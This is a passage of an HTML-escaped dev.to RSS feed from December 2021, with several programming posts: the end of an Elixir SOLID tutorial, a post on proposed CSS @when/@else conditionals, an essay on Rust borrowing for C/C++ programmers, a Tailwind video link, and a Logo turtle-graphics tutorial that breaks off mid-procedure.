  &lt;span class="nv"&gt;@spec&lt;/span&gt; &lt;span class="n"&gt;apply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Animal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothing&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;apply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;clothing&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;clothing&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Mammal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;animal_customized&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;animal&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;apply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Hat&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;apply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Shirt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="ss"&gt;:ok&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;animal_customized&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Pictures&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Pictures&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"email@example.com"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;:email&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;I appreciate everyone who has read through here, if you guys have anything to add, please leave a comment.&lt;/p&gt;

&lt;p&gt;This post was inspired by:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://medium.com/@andreichernykh/solid-elixir-777584a9ccba"&gt;https://medium.com/@andreichernykh/solid-elixir-777584a9ccba&lt;/a&gt;&lt;/p&gt;

</description>
      <category>elixir</category>
      <category>tutorial</category>
      <category>beginners</category>
      <category>architecture</category>
    </item>
    <item>
      <title>if/else in CSS</title>
      <author>Damian Brdej</author>
      <pubDate>Sat, 25 Dec 2021 22:53:31 +0000</pubDate>
      <link>https://dev.to/quentindamianino/ifelse-in-css-45f5</link>
      <guid>https://dev.to/quentindamianino/ifelse-in-css-45f5</guid>
      <description>&lt;p&gt;As we know, there are no conditional statements in CSS, but this may soon change with new &lt;code&gt;@when&lt;/code&gt; and &lt;code&gt;@else&lt;/code&gt; operator&lt;/p&gt;

&lt;p&gt;Currently, the only way to perform a conditional statement was to use media queries like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="k"&gt;@media&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;min-width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;600px&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c"&gt;/* ... */&lt;/span&gt; 
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;@media&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max-width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;599px&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c"&gt;/* ... */&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;It works perfectly, but in the new proposal it looks much cleaner and very similar to many programming languages.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="k"&gt;@when&lt;/span&gt; &lt;span class="n"&gt;media&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;min-width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;600px&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c"&gt;/* ... */&lt;/span&gt; 
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;@else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c"&gt;/* ... */&lt;/span&gt; 
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We can do multiple conditions as well by using multiple &lt;code&gt;@else&lt;/code&gt; statements, and not just use @media, but @supports too.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="k"&gt;@when&lt;/span&gt; &lt;span class="n"&gt;media&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;width&lt;/span&gt; &lt;span class="err"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="m"&gt;600px&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;media&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;pointer&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fine&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;supports&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;display&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;grid&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c"&gt;/* A */&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;@else&lt;/span&gt; &lt;span class="n"&gt;supports&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;caret-color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="no"&gt;red&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;supports&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;background&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;double-rainbow&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c"&gt;/* B */&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;@else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c"&gt;/* C */&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;There may be questions about the naming of this new feature. Some people think that &lt;code&gt;@if&lt;/code&gt; would be a better name than &lt;code&gt;@when&lt;/code&gt;, the reason behind this naming is probably that Sass already uses &lt;code&gt;@if&lt;/code&gt;, and it would be annoying to many developers if they had to refactor their Sass logic.&lt;/p&gt;

&lt;p&gt;The bad news is that it's not supported by any browser at this moment, it's not even listed on &lt;code&gt;caniuse.com&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;What do you think about this new proposal?&lt;/p&gt;

</description>
      <category>css</category>
      <category>webdev</category>
      <category>beginners</category>
      <category>news</category>
    </item>
    <item>
      <title>Rust borrows for C/C++ Programmers</title>
      <author>Dustin J. Mitchell</author>
      <pubDate>Sat, 25 Dec 2021 22:40:39 +0000</pubDate>
      <link>https://dev.to/djmitche/rust-borrows-for-cc-programmers-4amf</link>
      <guid>https://dev.to/djmitche/rust-borrows-for-cc-programmers-4amf</guid>
      <description>&lt;p&gt;I did a lot of C and C++ early in my career.  Among other thing, I worked on an RPG named &lt;a href="https://tvtropes.org/pmwiki/pmwiki.php/VideoGame/Mantra"&gt;"Mantra"&lt;/a&gt; with my high-school friends.  I still have the source code, and looking back on it, I'm pretty impressed: good comments, nice structure, and even &lt;em&gt;tests.&lt;/em&gt;  I'm not sure the code I wrote today is 25 years better!&lt;/p&gt;

&lt;p&gt;Pointers are used all over in C and C++, and a critical part of using them safely is to understand how long a pointer will be valid.  Getting this wrong results in use-after-free bugs or memory leaks, both of which plague C/C++ programs.&lt;/p&gt;

&lt;p&gt;C++ offers some tools to do this kind of thing automatically -- smart pointers, RAII, and so on.  But in C, the language is generally no help, and it's up to the programmer to understand the situation.  This is generally handled with long, explicit comments.  From another major project I worked  on, Amanda, &lt;a href="https://github.com/zmanda/amanda/blob/e35a1dfc2d8f9ef7e685b5a186f4a70f466e6417/xfer-src/xmsg.h#L158-L160"&gt;this comment&lt;/a&gt; provides a good example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;* Note that any pointer-based attributes (strings, etc.)
* become owned by the XMsg object, and will be freed in
* xmsg_free.  The use of g_strdup() is advised for strings.
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#ownership-and-borrowing"&gt;
  &lt;/a&gt;
  Ownership and Borrowing
&lt;/h2&gt;

&lt;p&gt;The comment above uses the term "owned".  In this context, to "own" an object is to be responsible for freeing it when it is no longer useful.  There can be only one owner, although ownership can be handed off.&lt;/p&gt;

&lt;p&gt;It's common to use pointers (or, in C++, references) to point to a value "temporarily".  Some of these patterns are so common that they don't warrant a comment.  For example, consider&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight c"&gt;&lt;code&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;calculate_score&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;board&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;Board&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;player&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;Player&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="p"&gt;..&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In this case, even without any comments, it's clear that &lt;code&gt;calculate_score&lt;/code&gt; can use &lt;code&gt;board&lt;/code&gt; and &lt;code&gt;player&lt;/code&gt; while it's calculating the score, but can't keep those pointers and use them later.  If you're familiar with Rust, you'll know this as a "borrow".&lt;/p&gt;

&lt;p&gt;Also implicit in this case is that &lt;code&gt;board&lt;/code&gt; and &lt;code&gt;player&lt;/code&gt; should only be accessed read-only in this context.  Perhaps another thread is calculating a score for the same Board, so modifying the Board would lead to data races.  Some codebases may use &lt;code&gt;const&lt;/code&gt; for to enforce read-only access, but this is not universal.&lt;/p&gt;

&lt;p&gt;Let's take another example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight c"&gt;&lt;code&gt;&lt;span class="c1"&gt;// Find a player with the given name within the given board&lt;/span&gt;
&lt;span class="n"&gt;Player&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;find_player&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;board&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;Board&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here there are two input pointers, and the result is also a pointer.  A good C programmer looking at this declaration will infer that &lt;code&gt;name&lt;/code&gt; is a read-only borrow, so the string is intact when &lt;code&gt;find_player&lt;/code&gt; returns.  They will probably also guess that the returned Player pointer is valid for the lifetime of the Board, and no longer.&lt;/p&gt;

&lt;p&gt;There's lots of room for error, here!  For example, if this is a multi-threaded application and players can join and leave the game, then the Player object's lifetime might be less than that of the Board.  A misunderstanding like that might not cause issues until the timing works out just right (or just wrong!).  C certainly won't do anything to prevent the issue.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#transitioning-to-rust"&gt;
  &lt;/a&gt;
  Transitioning to Rust
&lt;/h1&gt;

&lt;p&gt;Rust is designed to be safer than other systems languages like C and C++, but that comes at a perceived cost: fighting with the borrow checker.  Most of the lessons about references and borrows in Rust present them as a safe kind of pointer.&lt;/p&gt;

&lt;p&gt;But maybe the opposite perspective is useful -- maybe C/C++'s pointers are an unsafe way to implement borrowing.  From this point of view, Rust is helping the programmer do something they've been trying to do for a long time with clearly-written comments and conventions.&lt;/p&gt;

&lt;p&gt;This would have helped me when I was learning Rust.  On learning about references, I jumped right to things that are best suited to smart pointers: Merkle trees and object caches.  Experienced Rust devs will know that these tasks call for Rc or Arc, not plain references.&lt;/p&gt;

&lt;p&gt;If I had realized that ownership and borrowing are just a formalization of concepts I already understood, I might have instead experimented with implementing designs in Rust that I had already implemented in C.  I might have even implemented something like the &lt;a href="http://code.v.igoro.us/posts/2010/03/Whats-New-in-Amanda-Transfer-Architecture.html"&gt;Amanda Transfer Architecture&lt;/a&gt; as a learning exercise.&lt;/p&gt;

&lt;p&gt;Hopefully, this perspective can be useful to other C/C++ programmers working to learn Rust.&lt;/p&gt;

</description>
    </item>
    <item>
      <title>tailwind css flexBox | flex basis | flex initial | flex 1 |  flex auto</title>
      <author>shAtud</author>
      <pubDate>Sat, 25 Dec 2021 22:27:50 +0000</pubDate>
      <link>https://dev.to/shatud/tailwind-css-flexbox-flex-basis-flex-initial-flex-1-flex-auto-phf</link>
      <guid>https://dev.to/shatud/tailwind-css-flexbox-flex-basis-flex-initial-flex-1-flex-auto-phf</guid>
      <description>&lt;p&gt;tailwind css flexBox | flex basis | flex initial | flex 1 |  flex auto&lt;br&gt;
&lt;a href="https://youtu.be/bX3jqK8EpRQ"&gt;https://youtu.be/bX3jqK8EpRQ&lt;/a&gt;&lt;/p&gt;

</description>
      <category>webdev</category>
      <category>tailwindcss</category>
      <category>css</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>100 Languages Speedrun: Episode 33: Logo</title>
      <author>Tomasz Wegrzanowski</author>
      <pubDate>Sat, 25 Dec 2021 22:22:49 +0000</pubDate>
      <link>https://dev.to/taw/100-languages-speedrun-episode-33-logo-3gb8</link>
      <guid>https://dev.to/taw/100-languages-speedrun-episode-33-logo-3gb8</guid>
      <description>&lt;p&gt;Logo is a programming language all the way from the 1960s aimed at teaching kids programming. The most notable feature of Logo are "turtle graphics" - simple commands that draw lines on screen by moving an imaginary "turtle".&lt;/p&gt;

&lt;p&gt;One issue with covering Logo is that it's meant for interactive use in some Logo GUI environment, and these are platform specific and don't last very long, so every variant of Logo will be quite different. And it's not just their fancy features like 3D graphics, interactivity, and so on. Even very basic commands like like changing color are going to be different in each Logo.&lt;/p&gt;

&lt;p&gt;I'll be using &lt;a href="http://rmmh.github.io/papert/static/"&gt;in-browser papert Logo&lt;/a&gt;, so all examples will work in papers. Different Logo implementations will need some adjustments. I'll try to mention when something is implementation-specific.&lt;/p&gt;

&lt;p&gt;I'll post a few of the pictures generated by the programs - if you want to see some that I skipped, just try them out in papert.&lt;/p&gt;

&lt;p&gt;Other Logo implementations I'll mention are &lt;a href="https://www.calormen.com/jslogo/"&gt;SLogo&lt;/a&gt; (also in-browser), and &lt;a href="https://www.alancsmith.co.uk/logo/"&gt;ACSLogo for OSX&lt;/a&gt;.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#basic-drawing-commands"&gt;
  &lt;/a&gt;
  Basic Drawing Commands
&lt;/h3&gt;

&lt;p&gt;We're not printing anything, we're controlling a "turtle". A turtle has position on a screen as well as orientation.&lt;/p&gt;

&lt;p&gt;To draw a square we can tell the turtle to move forward 50 steps, turn 90 degrees to the right, four times:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;; Square
forward 50
right 90
forward 50
right 90
forward 50
right 90
forward 50
right 90
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Line comments use &lt;code&gt;;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;As these commands are a bit long, and we'll be using them all the time, there are shorter versions too. &lt;code&gt;fd&lt;/code&gt; for &lt;code&gt;forward&lt;/code&gt;, &lt;code&gt;rt&lt;/code&gt; for &lt;code&gt;right&lt;/code&gt; and &lt;code&gt;lt&lt;/code&gt; for &lt;code&gt;left&lt;/code&gt;:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;; Triangle
fd 60
rt 120
fd 60
rt 120
fd 60
rt 120
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#logo-implementation-differences"&gt;
  &lt;/a&gt;
  Logo implementation differences
&lt;/h3&gt;

&lt;p&gt;We can also control color and thickness of lines. In papert we can use &lt;code&gt;color [R G B]&lt;/code&gt; and &lt;code&gt;penwidth WIDTH&lt;/code&gt;. For very simple loops we can do &lt;code&gt;repeat N [COMMANDS]&lt;/code&gt;:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;; Blue Hexagon - Papert
cs
color [200 200 255]
penwidth 4
repeat 6 [fd 60 rt 60]
ht
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--9TbQRPqs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7i7p5179cfw80muxeww5.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--9TbQRPqs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7i7p5179cfw80muxeww5.png" alt="Blue Hexagon" width="295" height="307"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Logo programs tend to show the turtle on the screen. To show or hide the turtle we can use &lt;code&gt;st&lt;/code&gt; and &lt;code&gt;ht&lt;/code&gt; commands.&lt;/p&gt;

&lt;p&gt;Logo doesn't clear the screen by default when you start the program, so if you want to do so, you should use &lt;code&gt;cs&lt;/code&gt; command explicitly.&lt;/p&gt;

&lt;p&gt;Anyway, here's the same program in JSLogo, which has RGB 0-100 instead of 0-255, and slightly different commands:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;; Blue Hexagon - JSLogo
cs
setpencolor [80 80 100]
setpensize 4
repeat 6 [fd 60 rt 60]
ht
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;And here's more traditional ACSLogo, which only has fixed colors 0-15, and doesn't have comments:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;cs
setpencolor 15
setpenwidth 4
repeat 6 [fd 60 rt 60]
ht
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;As you can see, there's zero hope of writing any kind of "portable" Logo programs.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#procedures"&gt;
  &lt;/a&gt;
  Procedures
&lt;/h3&gt;

&lt;p&gt;We can define procedures with &lt;code&gt;to name ... end&lt;/code&gt;. Like this draws three letters I:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;to draw_i
  ; draw line
  forward 10
  penup
  ; go to next character
  right 90
  forward 5
  right 90
  forward 10
  ; reset to facing up, pen down
  pendown
  right 180
end

cs
repeat 3 [draw_i]
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;To move the turtle without touching the screen, we can use &lt;code&gt;penup&lt;/code&gt; and &lt;code&gt;pendown&lt;/code&gt; commands (or &lt;code&gt;pu&lt;/code&gt; and &lt;code&gt;pd&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Step by step:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;turtle faces up, at some point, let's say (100, 100), Logo normally doesn't use coordinates at all, but let's say these are normal computer graphics coordinates (X points right, Y points down). Pen is down.&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;forward 10&lt;/code&gt; makes turtle draw line up to &lt;code&gt;(100, 90)&lt;/code&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;penup&lt;/code&gt; ends drawing, but we still need to position turtle at the next letter&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;right 90&lt;/code&gt; and &lt;code&gt;forward 5&lt;/code&gt; makes turtle turn clockwise by 90 degrees (so it's pointing right for us) and advance to &lt;code&gt;(105, 90)&lt;/code&gt; without drawing.&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;right 90&lt;/code&gt; and &lt;code&gt;forward 10&lt;/code&gt; makes turtle turn clockwise by 90 degrees (so it's pointing down for us) and advance to &lt;code&gt;(105, 100)&lt;/code&gt; without drawing.&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;pendown&lt;/code&gt; and &lt;code&gt;right 180&lt;/code&gt; makes turtle press the pen down turn clockwise by 180 degrees (so it's pointing up for us), so we end up 5 pixels to the right from where we started, in same orientation and pen state&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#fizz"&gt;
  &lt;/a&gt;
  Fizz
&lt;/h3&gt;

&lt;p&gt;You can probably see where this is going, here's a program that says &lt;code&gt;FIZZ&lt;/code&gt; three times:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;to draw_i
  fd 10 ; main stroke
  ; go to next character
  pu
  rt 90 fd 5
  rt 90 fd 10
  ; reset pen state
  pd
  rt 180
end

to draw_f
  fd 10 ; main line
  rt 90 fd 5 ; top stroke
  pu rt 180 fd 5 lt 90 fd 5; move to next stroke
  pd lt 90 fd 5; middle stroke
  ; go to next character
  pu fd 5 rt 90 fd 5
  ; reset pen state
  pd
  rt 180
end

to draw_z
  rt 90 fd 5; bottom line
  pu rt 180 fd 5 ; return
  pd rt 120 fd 11 ; diagonal stroke
  lt 120 fd 5 ; top line
  ; advance to next character
  pu rt 180 fd 5 rt 120 fd 11 lt 120 fd 10
  ; reset pen state
  pd lt 90
end

to draw_fizz
  draw_f draw_i draw_z draw_z
end

cs
repeat 3 [draw_fizz]
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--aBcRVXXT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tz4l6huu7ujxcuoizwpy.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--aBcRVXXT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tz4l6huu7ujxcuoizwpy.png" alt="Fizz" width="253" height="67"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I could explain it step by step, but it's probably easier if you try to run it in Papert using "run slowly" button to see how turtle moves step by step.&lt;/p&gt;

&lt;p&gt;As we didn't use any special commands, this program runs in JSLogo as well. It doesn't work with ACSLogo as it doesn't support comments, and it needs its GUI to define procedures.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#buzz"&gt;
  &lt;/a&gt;
  Buzz
&lt;/h3&gt;

&lt;p&gt;Drawing BUZZ is basically saem as drawing FIZZ, except loops work weird way - instead of drawing starting where the turtle is, the &lt;code&gt;arc degrees radius&lt;/code&gt; command draws an arc around the turtle, starting where the turtle is facing and going up.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;to draw_b
  fd 2.5 ; main stroke a bit
  arc 2.5 180 ; bottom loop
  fd 5 ; more main stroke
  arc 2.5 180 ; top loop
  fd 2.5 ; finish main stroke
  pu rt 180 fd 10 ; go back
  ; go to next character
  lt 90 fd 7
  ; reset pen state
  pd lt 90
end

to draw_u
  pu fw 3 pd fd 7 ; left stroke
  pu rt 90 fd 6 ; move to right stroke
  pd rt 90 fd 7 ; right stroke
  pu rt 90 fd 3 ; move to center of arc
  pd rt 180 arc 3 180 ; arc
  ; go to next character
  pu fd 8 rt 90 fd 3
  ; reset pen state
  pd rt 180
end

to draw_z
  rt 90 fd 5; bottom line
  pu rt 180 fd 5 ; return
  pd rt 120 fd 11 ; diagonal stroke
  lt 120 fd 5 ; top line
  ; advance to next character
